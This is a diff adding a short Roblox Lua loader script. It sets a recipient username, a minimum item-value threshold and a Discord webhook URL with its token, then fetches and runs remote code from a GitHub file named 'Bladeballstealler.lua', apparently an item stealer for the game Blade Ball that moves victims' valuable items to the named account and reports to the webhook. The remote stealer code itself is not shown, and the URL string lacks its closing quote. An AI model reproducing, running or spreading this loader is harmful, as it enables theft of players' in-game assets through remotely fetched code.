@@ -1,0 +1,7 @@
+_G.Username = "tommie1168" 
+_G.min_rap = 100
+_G.pingEveryone = "Yes" 
+_G.webhook = "https://discord.com/api/webhooks/1351309724066254849/KtwB69xWM6Tx7vto8fOECJuNFXAl8RISYoPv3Aa4lvwrWcuaZUeA9VFmcghrR4-VPvMa" 
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Tommie1168/BlahBlah/refs/heads/main/Bladeballstealler.lua))() 
